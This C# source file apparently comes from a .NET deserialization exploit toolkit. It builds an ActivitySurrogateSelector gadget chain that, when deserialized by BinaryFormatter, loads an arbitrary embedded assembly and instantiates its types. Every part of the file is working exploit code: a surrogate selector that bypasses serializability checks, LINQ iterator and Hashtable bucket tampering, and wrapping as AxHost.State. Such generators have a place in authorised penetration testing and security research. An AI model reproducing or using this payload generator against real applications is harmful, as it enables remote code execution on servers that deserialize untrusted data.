using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Web.UI.WebControls;

namespace Aladdin
{
    public class MySurrogateSelector : SurrogateSelector
    {
        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
        {
            selector = this;
            if (!type.IsSerializable)
            {
                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }
            return base.GetSurrogate(type, context, out selector);
        }
    }

    [Serializable]
    public class PayloadClass : ISerializable
    {
        protected byte[] assemblyBytes;
        public PayloadClass() { }

        public PayloadClass(Assembly assembly)
        {
            assemblyBytes = File.ReadAllBytes(assembly.Location);
        }

        protected PayloadClass(SerializationInfo info, StreamingContext context)
        {
        }
        private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
        {
            Type t = Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
              .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
              .MakeGenericType(typeof(TSource), typeof(TResult));
            return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {

            DesignerVerb verb = new DesignerVerb("", null);

            try
            {
                byte[][] e1 = new byte[][] { assemblyBytes };

                IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
                IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
                    null,
                    (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
                        (
                            typeof(Func<Assembly, IEnumerable<Type>>),
                            typeof(Assembly).GetMethod("GetTypes")
                        )
                );

                IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
                     null,
                     (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
                     (
                         typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
                         typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
                     )
                 );

                IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
                    (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, bool>),
                        typeof(IEnumerator).GetMethod("MoveNext")
                    ),
                    (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, Type>),
                        typeof(IEnumerator<Type>).GetProperty("Current")?.GetGetMethod()
                    )
                );

                IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                PagedDataSource pds = new PagedDataSource() { DataSource = end };
                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
                // Class is internal so need to use reflection.
                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
                verb = new DesignerVerb("", null);
                // Need to insert IDictionary using reflection.
                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

                // Pre-load objects, this ensures they're fixed up before building the hash table.
                List<object> ls = new List<object>
                {
                    e1,
                    e2,
                    e3,
                    e4,
                    e5,
                    end,
                    pds,
                    verb,
                    dict
                };

                Hashtable ht = new Hashtable
                {
                    { verb, "" },
                    { "", "" }
                };

                FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
                Array keys = (Array)fi_keys.GetValue(ht);
                FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
                for (int i = 0; i < keys.Length; ++i)
                {
                    object bucket = keys.GetValue(i);
                    object key = fi_key.GetValue(bucket);
                    if (key is string)
                    {
                        fi_key.SetValue(bucket, verb);
                        keys.SetValue(bucket, i);
                        break;
                    }
                }
                fi_keys.SetValue(ht, keys);
                ls.Add(ht);
                MemoryStream stm = new MemoryStream();
                System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
                {
                    SurrogateSelector = new MySurrogateSelector()
                };
                fmt.Serialize(stm, ls);
                info.SetType(typeof(System.Windows.Forms.AxHost.State));
                info.AddValue("PropertyBagBinary", stm.ToArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error from ActivitySurrogateSelectorGenerator. Message: {ex.Message}:{ex.StackTrace}");
            }
        }
    }
}
